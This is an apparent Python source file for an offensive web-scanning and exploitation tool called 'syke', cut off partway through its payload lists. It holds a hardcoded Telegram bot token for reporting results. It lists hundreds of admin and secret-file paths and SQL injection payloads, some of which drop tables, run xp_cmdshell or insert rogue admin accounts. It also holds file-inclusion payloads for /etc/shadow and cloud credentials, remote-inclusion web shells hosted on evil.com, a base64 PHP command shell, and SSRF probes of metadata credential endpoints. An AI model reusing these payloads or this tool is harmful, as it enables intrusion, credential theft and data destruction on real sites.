import re, sys, os, threading, random, string, time, queue, json, csv
import datetime, socket, ssl, base64, hashlib, struct, argparse
import signal, traceback, hmac as _hmac_mod, platform
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import (urlparse, urljoin, urlencode, quote, unquote,
                          parse_qsl, parse_qs, urlunparse)
import http.client as _hc
import html as _html_mod
import urllib.request as _ureq

                                                                                
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] pip install requests pystyle")
    sys.exit(1)

try:
    from pystyle import Colors, Colorate, Write, System
except ImportError:
    print("[!] pip install pystyle")
    sys.exit(1)

try:
    from Crypto.Cipher import AES as _AES
    _CRYPTO_OK = True
except ImportError:
    _CRYPTO_OK = False

try:
    import telegram
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import (Application, CommandHandler, MessageHandler,
                               filters, ContextTypes, CallbackQueryHandler,
                               ConversationHandler)
    TG_LIB = True
except ImportError:
    TG_LIB = False

                                                                                 
                                
                                                                                 

_c = Colors

_SYKE_THEMES = {
    # ── purple/blue originals ──────────────────────────────────────────────
    "purple_galaxy": (_c.purple_to_blue,  _c.blue_to_purple, _c.purple_to_blue,  _c.blue_to_purple),
    "nebula":        (_c.purple_to_blue,  _c.blue_to_purple, _c.purple_to_blue,  _c.blue_to_purple),
    "cosmic":        (_c.blue_to_purple,  _c.purple_to_blue, _c.blue_to_purple,  _c.purple_to_blue),
    "deep_space":    (_c.blue_to_purple,  _c.purple_to_blue, _c.blue_to_purple,  _c.purple_to_blue),
    "void_pulse":    (_c.purple_to_blue,  _c.blue_to_purple, _c.purple_to_blue,  _c.blue_to_purple),
    "violet_space":  (_c.purple_to_blue,  _c.blue_to_purple, _c.purple_to_blue,  _c.blue_to_purple),
    "red_cosmic":    (_c.purple_to_blue,  _c.blue_to_purple, _c.purple_to_blue,  _c.blue_to_purple),

    # ── white → blue variations (NEW) ─────────────────────────────────────
    "arctic_ice":    (_c.white_to_blue,   _c.blue_to_white,  _c.white_to_blue,   _c.blue_to_white),
    "frost":         (_c.white_to_blue,   _c.white_to_blue,  _c.blue_to_white,   _c.blue_to_white),
    "glacier":       (_c.blue_to_white,   _c.white_to_blue,  _c.blue_to_white,   _c.white_to_blue),
    "ice_crystal":   (_c.blue_to_white,   _c.blue_to_white,  _c.white_to_blue,   _c.white_to_blue),
    "ocean_mist":    (_c.white_to_blue,   _c.blue_to_purple, _c.white_to_blue,   _c.blue_to_purple),
    "azure":         (_c.white_to_blue,   _c.blue_to_purple, _c.blue_to_white,   _c.purple_to_blue),
    "polar":         (_c.blue_to_white,   _c.white_to_blue,  _c.purple_to_blue,  _c.blue_to_white),
    "frostbite":     (_c.white_to_blue,   _c.blue_to_white,  _c.blue_to_purple,  _c.purple_to_blue),
    "iceberg":       (_c.blue_to_white,   _c.white_to_blue,  _c.blue_to_white,   _c.purple_to_blue),
    "blizzard":      (_c.white_to_blue,   _c.white_to_blue,  _c.white_to_blue,   _c.blue_to_white),
    "crystal_blue":  (_c.blue_to_white,   _c.white_to_blue,  _c.blue_to_white,   _c.blue_to_purple),
    "winter_sky":    (_c.white_to_blue,   _c.blue_to_white,  _c.purple_to_blue,  _c.blue_to_white),

    # ── other colour families (NEW) ─────────────────────────────────────
    "solar_flare":   (_c.red_to_yellow,   _c.yellow_to_red,  _c.red_to_yellow,   _c.yellow_to_red),
    "inferno":       (_c.yellow_to_red,   _c.red_to_yellow,  _c.yellow_to_red,   _c.red_to_yellow),
    "ember":         (_c.red_to_yellow,   _c.red_to_yellow,  _c.yellow_to_red,   _c.yellow_to_red),
    "emerald":       (_c.green_to_cyan,   _c.cyan_to_green,  _c.green_to_cyan,   _c.cyan_to_green),
    "jungle":        (_c.cyan_to_green,   _c.green_to_cyan,  _c.cyan_to_green,   _c.green_to_cyan),
    "aurora":        (_c.green_to_cyan,   _c.cyan_to_green,  _c.purple_to_blue,  _c.blue_to_purple),
    "northern_lights":(_c.green_to_cyan,  _c.blue_to_purple, _c.purple_to_blue,  _c.cyan_to_green),
    "toxic":         (_c.green_to_cyan,   _c.green_to_cyan,  _c.cyan_to_green,   _c.cyan_to_green),
    "sapphire":      (_c.blue_to_purple,  _c.white_to_blue,  _c.purple_to_blue,  _c.blue_to_white),
    "twilight":      (_c.purple_to_blue,  _c.red_to_yellow,  _c.blue_to_purple,  _c.yellow_to_red),
}

_ACTIVE_THEME_NAME = "purple_galaxy"
def _set_syke_theme(name):
    global C1, C2, C3, C4, _ACTIVE_THEME_NAME
    if name in _SYKE_THEMES:
        C1, C2, C3, C4 = _SYKE_THEMES[name]
        _ACTIVE_THEME_NAME = name

def _theme_select_menu():
    _banner()
    names  = list(_SYKE_THEMES.keys())
    labels = [n.replace("_galaxy","").replace("_"," ").strip() for n in names]
    _menu_box("SELECT THEME", [f"[{i+1:02d}]  {lbl}" for i, lbl in enumerate(labels)] + ["[0]   back"])
    ch = _ask("theme number")
    if ch in ("0", ""):
        return
    try:
        idx = int(ch) - 1
        if 0 <= idx < len(names):
            _set_syke_theme(names[idx])
            _info(f"Theme set: {names[idx]}")
            time.sleep(0.8)
    except (ValueError, TypeError):
        pass

RED   = "\033[91m"
GRN   = "\033[92m"
YLW   = "\033[93m"
BLU   = "\033[94m"
PUR   = "\033[95m"
CYN   = "\033[96m"
WHT   = "\033[97m"
DIM   = "\033[2m"
BLD   = "\033[1m"
UND   = "\033[4m"
RST   = "\033[0m"
R = RED; G = GRN; Y = YLW; B = BLU; P = PUR; C = CYN; W = WHT; D = DIM

BANNER_TEXT = r"""
                .                                  
               @88>         .                      
   .u    .     %8P          E          x.    .     
 .d88B :@8c     .        .x+E:..     .@88k  z88u   
="8888f8888r  .@88u    u8~  E  `b.  ~"8888 ^8888   
  4888>'88"  ''888E`  t8E   E d888>   8888  888R   
  4888> '      888E   88N.  E'8888~   8888  888R   
  4888>        888E   88888b&.`""`    8888  888R   
 .d888L .+     888E   '88888888e.     8888 ,888B . 
 ^"8888*"      888&     "*8888888N   "8888Y 8888"  
    "Y"        R888"   uu. ^8*8888E   `Y"   'YP    
                ""    @888L E `"88E                
                     '8888~ E   98~                
                      `*.   E  .*"                 
                        `~==R=~`"""

BANNER_BOX = ""

                                                                                 
                         
                                                                                 

TG_RESULT_GROUP  = -5292752638
TG_BOT_TOKEN     = "8911975377:AAG3uT6FccDPsCk194aDzjWo95W0AmCvc4o"
TG_CREDS_FILE    = "syke_users.json"
TG_SESSIONS_FILE = "syke_sessions.json"

                                                                                 
                       
                                                                                 

THREADS      = 25
TIMEOUT      = 12
DELAY        = 0.0
PROXY        = None
PROXY_CFG    = None
VERBOSE      = False
DEBUG        = False
DEBUG_MODE   = False
VERIFY_SSL   = False
OUT_DIR      = "syke_output"
SID          = (datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S") +
                "_" + "".join(random.choices(string.ascii_lowercase, k=4)))
OUTPUT_FILE  = f"syke_results_{SID}.txt"
OUTPUT_JSON  = f"syke_results_{SID}.json"
DISCORD_HOOK = None
TELEGRAM_BOT = TG_BOT_TOKEN or None
TELEGRAM_CID = None
CHAIN_MODE   = False
CUSTOM_BD    = {}
LOCK         = threading.Lock()
FINDINGS     = []
PWNED_LIST   = []
PROGRESS     = {}
RESUME_FILE  = "syke_resume.json"
_start_time  = time.time()
STATS        = {"crit":0,"hi":0,"med":0,"lo":0,"info":0,
                "total":0,"success":0,"fail":0}
CURRENT_USER = None
RATE_LIMIT_CODES = {429, 503, 509, 999}

CVE_SEVERITY_COLORS = {
    "CRITICAL": RED, "HIGH": YLW, "MEDIUM": CYN, "LOW": PUR, "INFO": DIM
}

                                                                                 
                                
                                                                                 

ADMIN_PATHS = list(dict.fromkeys([
    "/admin", "/admin/", "/admin/login", "/admin/login.php", "/admin/index.php",
    "/administrator", "/administrator/", "/administrator/index.php",
    "/admin1", "/admin2", "/admin3", "/admin4", "/admin5",
    "/adminarea", "/adminarea/", "/adminarea/index.php",
    "/admincp", "/admincp/", "/admincp/index.php",
    "/admin_area", "/admin_area/", "/admin_area/index.php",
    "/adminpanel", "/adminpanel/",
    "/admins", "/admins/",
    "/admin/account.php", "/admin/main.php", "/admin/admin.php",
    "/admin/home.php", "/admin/default.php", "/admin/manage.php",
    "/admin/dashboard", "/admin/dashboard/", "/admin/control",
    "/panel", "/panel/", "/panel/index.php", "/panel/login.php",
    "/controlpanel", "/controlpanel/",
    "/cp", "/cp/", "/cp/index.php", "/cp/login.php",
    "/cms", "/cms/", "/cms/login.php", "/cms/admin/",
    "/backend", "/backend/",
    "/siteadmin", "/siteadmin/", "/siteadmin/login.php",
    "/webadmin", "/webadmin/", "/webadmin/index.php",
    "/moderator", "/moderator/",
    "/moderator/login.php", "/moderator/admin.php",
    "/user", "/user/login", "/users", "/users/admin",
    "/superadmin", "/superadmin/",
    "/wp-admin", "/wp-admin/", "/wp-admin/index.php",
    "/wp-login.php", "/wp-login", "/wp-register.php",
    "/wordpress/wp-admin/", "/wordpress/wp-login.php",
    "/wp-admin/admin-ajax.php", "/wp-admin/options-general.php",
    "/wp-admin/theme-editor.php", "/wp-admin/plugin-editor.php",
    "/wp-admin/plugins.php", "/wp-admin/users.php",
    "/wp-admin/user-new.php", "/wp-admin/export.php",
    "/wp-admin/import.php", "/wp-admin/update-core.php",
    "/wp-admin/network/", "/wp-admin/network/sites.php",
    "/wp-admin/ms-admin.php",
    "/xmlrpc.php", "/wp-cron.php",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
    "/wp-content/debug.log",
    "/phpmyadmin", "/phpmyadmin/", "/phpmyadmin/index.php",
    "/phpMyAdmin", "/phpMyAdmin/", "/phpMyAdmin/index.php",
    "/pma", "/pma/", "/pma/index.php",
    "/mysql", "/mysql/", "/mysql/index.php",
    "/mysqladmin", "/mysqladmin/",
    "/myadmin", "/myadmin/",
    "/dbadmin", "/dbadmin/",
    "/phpmy", "/phpmy/",
    "/sql", "/sql/index.php",
    "/cpanel", "/cpanel/", "/cpanel/login",
    "/whm", "/whm/", "/whm/index.php",
    "/plesk", "/plesk/", "/plesk/login",
    "/directadmin", "/directadmin/",
    "/webmail", "/webmail/", "/webmail/login",
    "/roundcube", "/roundcube/",
    "/squirrelmail", "/squirrelmail/",
    "/horde", "/horde/",
    "/login", "/login/", "/login.php", "/login.asp", "/login.aspx",
    "/login.jsp", "/login.html", "/login.htm", "/login.cfm",
    "/logon", "/logon.php", "/logon.asp",
    "/signin", "/signin.php", "/signin.asp", "/signin.aspx",
    "/auth", "/auth/", "/auth/login", "/authentication",
    "/secure", "/secure/", "/secure/login",
    "/security", "/security/login",
    "/portal", "/portal/", "/portal/login", "/portal/login.php",
    "/dashboard", "/dashboard/",
    "/console", "/console/", "/console/login",
    "/management", "/management/",
    "/manager", "/manager/", "/manager/html",
    "/manage", "/manage/", "/manage.php",
    "/maintenance", "/maintenance/",
    "/config", "/config/", "/configuration", "/configuration.php",
    "/setup", "/setup/", "/setup.php",
    "/install", "/install/", "/install.php",
    "/config.php", "/config.inc.php",
    "/configuration.php", "/settings.php",
    "/include", "/includes", "/includes/",
    "/include/config.php", "/includes/config.php",
    "/application", "/application/",
    "/app", "/app/", "/app/admin",
    "/system", "/system/", "/system/login",
    "/sysadmin", "/sysadmin/",
    "/root", "/root/", "/rootadmin",
    "/master", "/master/", "/master/login",
    "/webmaster", "/webmaster/",
    "/server", "/server/", "/server-status", "/server-info",
    "/status", "/status/",
    "/info", "/info.php", "/phpinfo.php", "/phpinfo",
    "/test", "/test/", "/test.php",
    "/dev", "/dev/", "/development",
    "/staging", "/staging/",
    "/demo", "/demo/",
    "/debug", "/debug/",
    "/error_log", "/error.log", "/errors.log",
    "/access_log", "/access.log",
    "/.htaccess", "/.htpasswd",
    "/.git", "/.git/config", "/.git/HEAD",
    "/.gitignore", "/.gitmodules", "/.svn", "/.svn/entries",
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.ssh", "/.ssh/id_rsa", "/.ssh/known_hosts",
    "/backup", "/backup/", "/backups", "/backups/",
    "/backup.sql", "/backup.zip", "/backup.tar.gz",
    "/db_backup", "/database_backup",
    "/old", "/old/", "/archive", "/archive/",
    "/tmp", "/tmp/", "/temp", "/temp/",
    "/upload", "/upload/", "/uploads", "/uploads/",
    "/files", "/files/", "/file", "/file/",
    "/private", "/private/",
    "/hidden", "/hidden/",
    "/secret", "/secret/",
    "/data", "/data/",
    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3",
    "/api/admin", "/api/auth", "/api/login", "/api/token",
    "/api/users", "/api/config", "/api/settings",
    "/rest", "/rest/", "/rest/api",
    "/graphql", "/graphiql", "/playground",
    "/swagger", "/swagger-ui.html", "/swagger.json",
    "/openapi.json", "/openapi.yaml", "/api-docs",
    "/actuator", "/actuator/health", "/actuator/env",
    "/actuator/beans", "/actuator/mappings", "/actuator/info",
    "/metrics", "/health", "/healthz", "/ping", "/version",
    "/trace", "/__admin", "/_admin", "/_debug",
    "/ajax", "/ajax/", "/ajax.php",
    "/cgi-bin", "/cgi-bin/", "/cgi-bin/admin.pl",
    "/cgi-bin/login.pl", "/cgi-bin/admin.py",
    "/bin", "/bin/", "/scripts", "/scripts/",
    "/tools", "/tools/", "/utils", "/utils/",
    "/shell.php", "/cmd.php", "/c99.php", "/r57.php",
    "/admin.php", "/admin.asp", "/admin.aspx", "/admin.cfm",
    "/admin.do", "/admin.jsp", "/admin.nsf", "/admin.pl",
    "/adminlogin", "/adminlogin.php",
    "/admin_login", "/admin_login.php",
    "/administration", "/administration/",
    "/administrador", "/administracion",
    "/gestion", "/gestion/",
    "/intranet", "/intranet/",
    "/internal", "/internal/",
    "/corp", "/corp/",
    "/extranet", "/extranet/",
    "/home", "/home/admin",
    "/user/admin", "/user/administrator",
    "/account", "/account/",
    "/accounts", "/accounts/",
    "/profile", "/profile/",
    "/members", "/members/",
    "/member", "/member/",
    "/users/login", "/users/admin",
    "/user/login", "/user/admin",
    "/customer", "/customer/",
    "/clients", "/clients/",
    "/client", "/client/",
    "/shop", "/shop/admin",
    "/store", "/store/admin",
    "/ecommerce", "/ecommerce/admin",
    "/forum", "/forum/admin", "/forums", "/forums/admin",
    "/board", "/board/admin", "/boards/",
    "/blog", "/blog/wp-admin", "/blog/wp-login.php",
    "/news", "/news/admin",
    "/wiki", "/wiki/admin",
    "/docs", "/docs/admin",
    "/support", "/support/admin",
    "/ticket", "/ticket/admin", "/tickets",
    "/helpdesk", "/helpdesk/",
    "/crm", "/crm/", "/crm/admin",
    "/erp", "/erp/",
    "/hrm", "/hrm/",
    "/inventory", "/inventory/",
    "/billing", "/billing/",
    "/reports", "/reports/",
    "/analytics", "/analytics/admin",
    "/statistics", "/statistics/",
    "/monitor", "/monitor/",
    "/monitoring", "/monitoring/",
    "/logs", "/logs/", "/log/", "/log",
    "/audit", "/audit/",
    "/events", "/events/",
    "/notifications", "/notifications/",
    "/mail", "/mail/", "/email", "/email/",
    "/smtp", "/smtp/",
    "/ftp", "/ftp/",
    "/sftp", "/sftp/",
    "/ssh", "/ssh/",
    "/vnc", "/vnc/",
    "/rdp", "/rdp/",
    "/vpn", "/vpn/",
    "/remote", "/remote/",
    "/terminal", "/terminal/",
    "/cmd", "/cmd/",
    "/exec", "/exec/",
    "/run", "/run/",
    "/command", "/command/",
    "/ping.php", "/check.php",
    "/probe.php", "/scan.php",
    "/phpinfo.php", "/info.asp", "/server.asp",
    "/server.php", "/status.php", "/health.php",
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/.DS_Store", "/Thumbs.db", "/desktop.ini",
    "/web.config", "/web.config.bak",
    "/.npmrc", "/.yarnrc", "/Dockerfile",
    "/docker-compose.yml", "/Makefile",
    "/readme.html", "/readme.txt", "/README.md",
    "/changelog.txt", "/license.txt", "/CHANGELOG.md",
    "/composer.json", "/composer.lock",
    "/package.json", "/package-lock.json",
    "/Gemfile", "/Gemfile.lock",
    "/requirements.txt", "/Pipfile",
    "/wp-includes/version.php",
    "/wp-includes/", "/wp-content/",
    "/wp-content/plugins/", "/wp-content/themes/",
    "/wp-content/uploads/",
    "/wp-json/", "/wp-json/wp/v2/users",
    "/wp-json/wp/v2/settings",
    "/wp-json/wc/v3/customers",
    "/wp-json/wc/v3/orders",
    "/joomla", "/joomla/administrator",
    "/administrator/index.php",
    "/drupal", "/drupal/admin", "/user/login",
    "/sites/default/settings.php",
    "/magento", "/magento/admin", "/index.php/admin",
    "/opencart", "/opencart/admin",
    "/prestashop", "/prestashop/admin",
    "/laravel", "/laravel/public",
    "/storage/logs/laravel.log",
    "/storage/framework/", "/.env.example",
    "/application/config/database.php",
    "/application/logs/log-php.php",
    "/panel-administracion", "/panel-administracion/login.php",
    "/hub", "/hub/", "/hub/admin",
    "/site", "/site/", "/site/admin",
    "/websites", "/websites/admin",
    "/sitemanager", "/sitemanager/",
    "/filemanager", "/filemanager/",
    "/fileman", "/fileman/",
    "/elFinder", "/elFinder/",
    "/elfinder", "/elfinder/",
    "/acp", "/acp/", "/acp/index.php",
    "/ucp", "/ucp/", "/ucp/index.php",
    "/mcp", "/mcp/",
    "/maint", "/maint/",
    "/maintenance.php", "/maintenance/index.php",
    "/wp-signup.php", "/wp-activate.php",
    "/wp-trackback.php", "/wp-comments-post.php",
    "/xmlrpc", "/xmlrpc/",
    "/wp-admin/network/settings.php",
    "/wp-admin/network/plugins.php",
    "/xmlrpc.php?rsd",
    "/api/xmlrpc", "/API",
    "/api/1.0", "/api/2.0",
    "/.well-known", "/.well-known/security.txt",
    "/.well-known/acme-challenge",
    "/security.txt",
    "/adminer", "/adminer.php", "/adminer/",
    "/adminer.php?server=localhost",
    "/phpliteadmin", "/phpliteadmin.php",
    "/h5ai", "/h5ai/",
    "/gallery", "/gallery/admin",
    "/imageGallery", "/photos/admin",
    "/e107_admin", "/e107_admin/",
    "/adm", "/adm/", "/adm.php", "/adm.html",
    "/adm/index.php",
    "/index.php/user/login", "/index.php/admin",
    "/index.php?option=com_users",
    "/index.php?option=com_admin",
    "/secure/admin", "/secure/control",
    "/private/admin", "/protected/admin",
    "/go", "/go/admin", "/go/panel",
    "/manage/admin", "/manage/users",
    "/dashboard/admin", "/dashboard/users",
    "/control/panel", "/control/admin",
    "/wp-admin/admin.php", "/wp-admin/edit.php",
    "/wp-admin/upload.php", "/wp-admin/media-new.php",
    "/wp-admin/post-new.php", "/wp-admin/page-new.php",
    "/wp-admin/widgets.php", "/wp-admin/nav-menus.php",
    "/wp-admin/tools.php", "/wp-admin/site-health.php",
    "/api/v1/admin", "/api/v2/admin", "/api/v3/admin",
    "/api/v1/users", "/api/v2/users",
    "/api/v1/config", "/api/v2/config",
    "/api/internal", "/api/internal/users",
    "/api/internal/admin", "/api/secret",
    "/v1/admin", "/v2/admin", "/v3/admin",
    "/v1/users", "/v2/users",
    "/_admin", "/_panel", "/_config",
    "/_api", "/_debug", "/_test",
    "/owa", "/owa/auth", "/owa/auth/logon.aspx",
    "/exchange", "/exchange/owa",
    "/autodiscover", "/autodiscover/autodiscover.xml",
    "/lync", "/lync/meet", "/sharepoint",
    "/jenkins", "/jenkins/login", "/jenkins/j_acegi_security_check",
    "/gitlab", "/gitlab/admin", "/gitlab/users",
    "/sonar", "/sonarqube", "/sonarqube/admin",
    "/nexus", "/nexus/#admin", "/nexus/service",
    "/artifactory", "/artifactory/webapp",
    "/bamboo", "/bamboo/admin",
    "/confluence", "/confluence/admin",
    "/jira", "/jira/secure/Dashboard.jspa",
    "/bitbucket", "/bitbucket/admin",
    "/kibana", "/kibana/app/kibana",
    "/grafana", "/grafana/login",
    "/prometheus", "/prometheus/graph",
    "/alertmanager", "/zipkin",
    "/jaeger", "/jaeger/ui",
    "/consul", "/consul/ui",
    "/vault", "/vault/ui",
    "/minio", "/minio/login",
    "/portainer", "/portainer/#/auth",
    "/rancher", "/rancher/login",
    "/k8s", "/k8s/api", "/kubernetes",
    "/docker", "/docker/api", "/docker/swarm",
]))

PHPMYADMIN_PATHS = [
    "/phpmyadmin", "/phpmyadmin/", "/phpMyAdmin", "/phpMyAdmin/",
    "/pma", "/pma/", "/mysql", "/mysql/", "/myadmin", "/myadmin/",
    "/mysqladmin", "/mysqladmin/", "/dbadmin", "/dbadmin/",
    "/phpmy", "/phpmy/", "/phpmyadmin2", "/phpmyadmin2/",
    "/admin/phpmyadmin", "/admin/mysql",
    "/tools/phpMyAdmin", "/tools/phpmyadmin",
    "/database/phpmyadmin", "/db",
    "/phpmyadmin/index.php", "/pma/index.php",
    "/sql/phpmyadmin", "/db/phpmyadmin",
    "/mysql/phpmyadmin", "/server/phpmyadmin",
    "/panel/phpmyadmin", "/cp/phpmyadmin",
]

GIT_EXPOSED_PATHS = [
    "/.git/HEAD", "/.git/config", "/.git/index",
    "/.git/COMMIT_EDITMSG", "/.git/FETCH_HEAD",
    "/.git/logs/HEAD", "/.git/refs/heads/master",
    "/.git/refs/heads/main", "/.git/packed-refs",
    "/.git/objects/", "/.gitignore", "/.gitmodules",
    "/.svn/entries", "/.svn/wc.db",
    "/.hg/manifest", "/.bzr/branch-format",
    "/.git/description", "/.git/info/exclude",
    "/.git/refs/remotes/origin/HEAD",
]

REST_ENDPOINTS = [
    "/wp-json/", "/wp-json/wp/v2/users", "/wp-json/wp/v2/posts",
    "/wp-json/wp/v2/pages", "/wp-json/wp/v2/categories",
    "/wp-json/wp/v2/tags", "/wp-json/wp/v2/media",
    "/wp-json/wp/v2/settings", "/wp-json/wp/v2/plugins",
    "/wp-json/wp/v2/themes", "/wp-json/wp/v2/blocks",
    "/wp-json/wp/v2/comments",
    "/wp-json/wp/v2/users?context=edit",
    "/wp-json/wp/v2/users?per_page=100",
    "/wp-json/wc/v3/customers", "/wp-json/wc/v3/orders",
    "/wp-json/wc/v3/payment_gateways", "/wp-json/wc/v3/coupons",
    "/wp-json/yoast/v1/", "/wp-json/elementor/v1/",
    "/wp-json/acf/v3/", "/wp-json/rankmath/v1/",
    "/wp-json/jetpack/v4/", "/wp-json/contact-form-7/v1/",
]

                                                                                 
                              
                                                                                 

SQLI_PAYLOADS = [
    "'", "''", "`", "``", ",", '"', '""', "/", "//", "\\", "//\\",
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "') OR ('1'='1", "') OR ('1'='1'--",
    "' OR 'x'='x", "1' OR '1'='1", "1 OR 1=1",
    "admin'--", "admin' #", "admin'/*",
    "' UNION SELECT 1--", "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--",
    "1 UNION SELECT null--", "1 UNION SELECT null,null--",
    "1 UNION SELECT null,null,null--",
    "' AND SLEEP(5)--", "1 AND SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "') AND SLEEP(5)--", "1 AND 1=2 UNION SELECT 1--",
    "' AND 1=2 UNION SELECT user()--",
    "-1 UNION SELECT user(),version(),3--",
    "-1 UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "' AND extractvalue(1,concat(0x7e,user()))--",
    "' AND updatexml(1,concat(0x7e,user()),1)--",
    "1; SELECT SLEEP(5)--", "'; EXEC xp_cmdshell('id')--",
    "1 AND (SELECT * FROM(SELECT(SLEEP(5)))a)--",
    "admin' AND '1'='1", "' OR 'unusual'='unusual",
    "' UNION SELECT username,password,3 FROM users--",
    "' UNION SELECT user_login,user_pass,3 FROM wp_users--",
    "1 OR 1=1 ORDER BY 1--", "1 ORDER BY 1--",
    "1 ORDER BY 2--", "1 ORDER BY 3--", "1 ORDER BY 10--",
    "1 GROUP BY 1--", "1 GROUP BY 2--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "'; EXEC master..xp_cmdshell 'dir'--",
    "' OR 1=1 LIMIT 1 OFFSET 1--",
    "1; SELECT @@version--",
    "1; SELECT user()--",
    "1; SELECT database()--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "'; DECLARE @q NVARCHAR(200);SET @q=0x73656c65637420404076657273696f6e;EXEC(@q)--",
    "1; INSERT INTO admin_users (username,password) VALUES ('hacked','hacked')--",
    "'; DROP TABLE users; --",
    "1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'",
    "1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100",
    "1' AND '1'='1' UNION SELECT NULL,NULL,NULL--",
    "benchmark(10000000,md5('test'))--",
    "' OR BENCHMARK(10000000,MD5('test'))='",
    "1 RLIKE SLEEP(5)--",
    "' XOR SLEEP(5) XOR '",
]

SQL_UNION_PROBES = [
    "1 UNION SELECT 1--", "1 UNION SELECT 1,2--",
    "1 UNION SELECT 1,2,3--", "1 UNION SELECT 1,2,3,4--",
    "1 UNION SELECT 1,2,3,4,5--", "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--", "1 UNION SELECT NULL,NULL,NULL--",
    "1 UNION ALL SELECT NULL--", "1 UNION ALL SELECT 1,2,3--",
    "-1 UNION SELECT user(),version(),3--",
    "-1 UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "-1 UNION SELECT user_login,user_pass,3 FROM wp_users--",
    "' UNION SELECT 1--", "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--", "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION SELECT user(),version()--",
    "' UNION SELECT 1,2,load_file('/etc/passwd')--",
    "' UNION SELECT schema_name,2,3 FROM information_schema.schemata--",
    "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name=0x7573657273--",
]

LFI_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/etc/group", "/etc/issue", "/etc/os-release",
    "/proc/version", "/proc/cmdline", "/proc/self/environ",
    "/proc/self/cmdline", "/proc/self/status",
    "../etc/passwd%00", "../../etc/passwd%00",
    "..%2fetc%2fpasswd", "..%2f..%2fetc%2fpasswd",
    "..%252fetc%252fpasswd", "....//....//etc//passwd",
    "..%c0%af..%c0%afetc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
    "expect://id", "phar://test.jpg/shell",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log", "/var/log/syslog",
    "/Windows/win.ini", "C:\\Windows\\win.ini",
    "../../Windows/win.ini", "../../../Windows/win.ini",
    "C:\\boot.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\php.ini", "C:\\Windows\\my.ini",
    "/wp-config.php", "../wp-config.php", "../../wp-config.php",
    "/app/etc/env.php", "/app/etc/local.xml",
    "/etc/mysql/my.cnf", "/etc/php.ini", "/etc/php5/apache2/php.ini",
    "/etc/nginx/nginx.conf", "/etc/apache2/apache2.conf",
    "/usr/local/etc/nginx/nginx.conf",
    "/etc/httpd/conf/httpd.conf",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%u2215..%u2215etc%u2215passwd",
    "/%2F%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "/proc/self/fd/1", "/proc/self/fd/2",
    "/proc/1/cmdline", "/proc/1/environ",
    "/root/.bash_history", "/home/ubuntu/.bash_history",
    "/root/.ssh/id_rsa", "/home/ubuntu/.ssh/id_rsa",
    "/root/.aws/credentials", "/home/ubuntu/.aws/credentials",
]

LFI_PAT = re.compile(
    r'root:.*:0:0|daemon:|bin:|sys:|nobody:'
    r'|\[boot loader\]|\[fonts\]'
    r'|uid=\d+\(root\)|for 16-bit app support'
    r'|www-data:|apache:|mysql:|postgres:',
    re.I
)

RFI_PAYLOADS = [
    "http://evil.com/shell.php", "https://evil.com/shell.php",
    "http://evil.com/shell.php%00", "http://evil.com/shell.php?",
    "http://evil.com/shell.jpg", "http://evil.com/shell.txt",
    "ftp://evil.com/shell.php", "smb://evil.com/shell.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
    "php://input", "expect://id",
    "http://127.0.0.1/shell.php",
    "http://169.254.169.254/shell.txt",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/",
    "http://[::1]/", "http://[::]", "http://0/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1/", "http://10.0.0.1/",
